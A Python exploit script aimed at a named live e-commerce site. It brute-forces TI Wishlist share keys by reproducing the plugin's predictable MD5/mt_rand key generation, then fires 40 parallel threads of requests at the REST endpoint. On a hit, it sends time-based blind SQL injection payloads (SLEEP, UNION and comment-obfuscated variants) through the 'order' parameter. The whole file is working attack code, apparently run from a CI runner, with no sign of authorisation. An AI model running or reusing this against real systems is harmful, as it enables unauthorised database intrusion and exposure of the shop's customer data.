#!/usr/bin/env python3
"""Historical TI Wishlist share-key smash via PRNG + random hex; SQLi if populated."""
from __future__ import annotations

import hashlib
import json
import random
import statistics
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

KNOWN_EMPTY = {"a4bc53", "bfa79e", "c631be", "e6b382", "534e24", "50bc47"}
DAYS = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]


def date_r(dt: datetime) -> str:
    off = dt.strftime("%z")
    return (
        f"{DAYS[dt.weekday()]}, {dt.day:02d} {MONTHS[dt.month - 1]} {dt.year} "
        f"{dt.hour:02d}:{dt.minute:02d}:{dt.second:02d} {off}"
    )


def http(method: str, url: str, data=None, headers=None, timeout=25):
    h = {"User-Agent": "Mozilla/5.0 lurksek-sharekey", "Accept": "application/json"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read()
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body
    except Exception as e:
        return 0, time.time() - t0, str(e).encode()


def gen_prng_keys(max_unique: int = 80000) -> list[str]:
    """Dense historical PRNG: daily ? hours ? all mt_rand(0,3000) for 2023-2026 SAST/UTC."""
    keys: set[str] = set()
    # denser near recent years / shop activity windows
    specs = []
    for year in (2023, 2024, 2025, 2026):
        start = datetime(year, 1, 1, tzinfo=timezone(timedelta(hours=2)))
        end = datetime(year, 12, 31, tzinfo=timezone(timedelta(hours=2)))
        # every day for 2024?2026; every 3rd day for 2023
        step = 1 if year >= 2024 else 3
        d = start
        while d <= end:
            for hour in (9, 12, 15, 18, 21):
                for minute in (0, 30):
                    for tz_h in (2, 0):
                        specs.append((d.year, d.month, d.day, hour, minute, tz_h))
            d += timedelta(days=step)

    random.shuffle(specs)
    for year, month, day, hour, minute, tz_h in specs:
        if len(keys) >= max_unique:
            break
        try:
            dt = datetime(year, month, day, hour, minute, 0, tzinfo=timezone(timedelta(hours=tz_h)))
        except ValueError:
            continue
        dr = date_r(dt)
        for rnum in range(0, 3001):
            keys.add(hashlib.md5((dr + str(rnum)).encode()).hexdigest()[:6])
            if len(keys) >= max_unique:
                break

    # random hex filler
    while len(keys) < max_unique + 15000:
        keys.add(format(random.randint(0, 0xFFFFFF), "06x"))

    keys -= KNOWN_EMPTY
    out = list(keys)
    random.shuffle(out)
    return out


def probe_share(sk: str):
    code, t, body = http("GET", f"{TARGET}/wp-json/wc/v3/wishlist/get_by_share_key/{sk}", timeout=20)
    if code != 200:
        return None
    try:
        j = json.loads(body.decode("utf-8", "replace"))
    except Exception:
        return None
    if isinstance(j, dict) and j.get("share_key"):
        return j
    return None


def products_for(sk: str):
    code, t, body = http("GET", f"{TARGET}/wp-json/wc/v3/wishlist/{sk}/get_products?count=100", timeout=40)
    text = body.decode("utf-8", "replace")
    try:
        arr = json.loads(text)
        n = len(arr) if isinstance(arr, list) else -1
    except Exception:
        arr, n = None, -1
    return code, t, n, arr, text[:300]


def msf_order(share: str, order: str):
    q = urllib.parse.urlencode({"_method": "GET", "order": order, "count": 10, "offset": 0})
    url = f"{TARGET}/?{q}"
    data = f"rest_route=/wc/v3/wishlist/{share}/get_products".encode()
    return http(
        "POST",
        url,
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=120,
    )


def confirm_sqli(share: str) -> dict:
    suite = []
    payloads = [
        ("ASC1", "ASC"),
        ("ASC2", "ASC"),
        ("S5a", ",(SELECT SLEEP(5))--"),
        ("S5b", ",(SELECT SLEEP(5))--"),
        ("S10a", ",(SELECT SLEEP(10))--"),
        ("S10b", ",(SELECT SLEEP(10))--"),
        ("ASC3", "ASC"),
        ("U5", "DESC LIMIT 0 UNION SELECT SLEEP(5),2,3,4,5,6,7,8,9,10-- "),
        ("U10", "DESC LIMIT 0 UNION SELECT SLEEP(10),2,3,4,5,6,7,8,9,10-- "),
        ("C5", ",(SEL/**/ECT/**/SLEEP/**/(5))--"),
        ("C10", ",(SEL/**/ECT/**/SLEEP/**/(10))--"),
    ]
    for lab, order in payloads:
        code, t, body = msf_order(share, order)
        suite.append(
            {
                "label": lab,
                "order": order,
                "code": code,
                "time": round(t, 3),
                "body": body[:80].decode("utf-8", "replace"),
            }
        )
        print(f"SQLI {lab:5s} {code} {t:6.2f}", flush=True)

    asc = [x["time"] for x in suite if x["label"].startswith("ASC") and x["code"] == 200]
    s5 = [x["time"] for x in suite if x["label"].startswith("S5") and x["code"] == 200]
    s10 = [x["time"] for x in suite if x["label"].startswith("S10") and x["code"] == 200]
    confirmed = False
    reason = ""
    if asc and s5 and s10:
        a = statistics.median(asc)
        if all(t >= a + 3.5 for t in s5) and all(t >= a + 8 for t in s10):
            confirmed = True
            reason = f"plain ASC={a} S5={s5} S10={s10}"
    return {"confirmed": confirmed, "reason": reason, "suite": suite, "share": share}


def main():
    results = {
        "ts": time.time(),
        "found": [],
        "populated": [],
        "probe_n": 0,
        "confirmed": False,
    }

    print("generating keys?", flush=True)
    keys = gen_prng_keys(90000)
    # Cap remote probes for GHA runtime (~15?25 min at ~40 workers)
    probe_n = min(len(keys), 45000)
    probe_list = keys[:probe_n]
    results["probe_n"] = probe_n
    results["key_pool"] = len(keys)
    print(f"probing {probe_n} of {len(keys)} keys", flush=True)

    found = []
    checked = 0
    with ThreadPoolExecutor(max_workers=40) as ex:
        futs = {ex.submit(probe_share, sk): sk for sk in probe_list}
        for fut in as_completed(futs):
            checked += 1
            if checked % 1000 == 0:
                print(f"progress {checked}/{probe_n} found={len(found)}", flush=True)
            try:
                j = fut.result()
            except Exception:
                continue
            if j:
                found.append(j)
                print("FOUND_WL", j, flush=True)

    results["found"] = found
    populated = []
    for j in found:
        sk = j.get("share_key")
        code, t, n, arr, preview = products_for(sk)
        entry = {"share": sk, "code": code, "n": n, "time": round(t, 3), "meta": j, "preview": preview}
        print(f"PRODUCTS {sk} n={n} code={code}", flush=True)
        if n and n > 0:
            populated.append(entry)
            results["populated"].append(entry)

    results["found_count"] = len(found)
    results["populated_count"] = len(populated)

    if populated:
        sk = populated[0]["share"]
        print("POPULATED_SHARE", sk, "running SQLi", flush=True)
        sqli = confirm_sqli(sk)
        results["sqli"] = sqli
        results["confirmed"] = sqli["confirmed"]
        results["reason"] = sqli.get("reason", "")
        if sqli["confirmed"]:
            print("CRITICAL_SQLI_CONFIRMED", flush=True)
        else:
            print("POPULATED_BUT_SQLI_NOT_CONFIRMED", flush=True)
    else:
        print("NO_POPULATED_WISHLISTS", flush=True)

    for p in (OUT / "sharekey_results.json", Path("out/sharekey_results.json")):
        p.write_text(json.dumps(results, indent=2, default=str))
    print(
        "DONE found=",
        len(found),
        "populated=",
        len(populated),
        "confirmed=",
        results["confirmed"],
        flush=True,
    )


if __name__ == "__main__":
    main()
